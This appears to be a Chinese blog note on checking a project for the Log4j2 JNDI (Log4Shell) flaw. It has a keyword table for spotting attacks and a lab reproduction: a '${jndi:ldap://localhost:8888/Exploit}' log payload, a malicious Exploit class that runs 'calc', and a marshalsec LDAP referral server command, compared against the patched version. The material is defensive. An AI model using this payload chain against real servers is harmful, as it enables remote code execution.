---
order: 110
category:
  - Log
---

# 项目log4j漏洞问题排查
## 1. 自检（项目是否存在log4g漏洞）

**结论：不存在该漏洞**

1. 项目并没有引用到log4g-core
2. 也没有打印会引起该漏洞的关键字或规则

![image-20211222121156841](https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222121156841.png)

### 1.1 针对漏洞的自定义规则

| 规则         | 使用情况 |
| ------------ | -------- |
| tcp payload  | 未使用   |
| http msgbody | 未使用   |

### 1.2 日志排查关键字

| 关键字                                                       | 使用情况 |
| ------------------------------------------------------------ | -------- |
| Javax. naming Communicationexception                         | 未使用   |
| Javax. naming. Namingexception: problem generating object using object factory | 未使用   |
| Error looking up JNDI resource"关键字进行排查                | 未使用   |
| ${jndi: ladp或 rmi                                           | 未使用   |
| getobjectfactoryfromreferenc Idapurl Context hdil ookup等与jnd调用相关的堆栈信息。 | 未使用   |



## 2. log4j漏洞概述

该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未经身份验证的攻击者通过发送特定恶意数据包，可在目标服务器上执行任意代码。

## 3. 影响范围

Apache Log4j 2.x <= 2.15.0-rc1

## 4. 复现demo

### 4.1 新建maven项目

创建一个新的maven项目，并导入Log4j的依赖包

```xml
 <!--   bug版本log4j-core-2.14.1    -->
<dependency>
            	<groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.1</version>
        </dependency>

        <!--   已修复版本log4j-core-2.17.0    -->
<!--        <dependency>-->
<!--            <groupId>org.apache.logging.log4j</groupId>-->
<!--            <artifactId>log4j-core</artifactId>-->
<!--            <version>2.17.0</version>-->
<!--        </dependency>-->
```

### 4.2 漏洞利用

#### **4.2.1 使用POC测试**

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
class LogTest {
    public static final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        logger.error("${jndi:ldap://localhost:8888/Exploit}");
    }
}
```

#### 4.2.2 **编译一恶意类Exploit.class**

首先新建exp.java，然后编译为class文件

```java
class Exploit {
    static {
        System.err.println("Pwned");
        try {
            String cmds = "calc";
            Runtime.getRuntime().exec(cmds);
        } catch ( Exception e ) {
            e.printStackTrace();
        }
    }
}
javac exp.java
```

#### 4.2.3 **使用marshalsec-0.0.3-SNAPSHOT-all.jar本地开启一个LDAP服务**

```mipsasm
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer
"http://127.0.0.1:7777/#Exploit" 8888
```

#### 4.2.3 运行poc.java，即可访问恶意类并执行写在其中的"calc"命令

![image-20211222124406317](https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222124406317.png)

### 4.3 验证测试

#### 4.3.1 bug版本log4j-core-2.14.1

打印的日志会调用jndi

![image-20211222124709509](https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222124709509.png)

![image-20211222124917358](https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222124917358.png)

#### 4.3.2 已修复版本log4j-core-2.17.0

已修复版本就变成单纯的打印日志了

![image-20211222124814229](https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222124814229.png)

## 5. 项目验证

项目在log 中的jdni，并不会执行远程调用

![image-20211222125006483](https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222125006483.png)

## 参考文章

[手把手复现了 Log4j2 漏洞，太可怕了。。](https://segmentfault.com/a/1190000041117219)

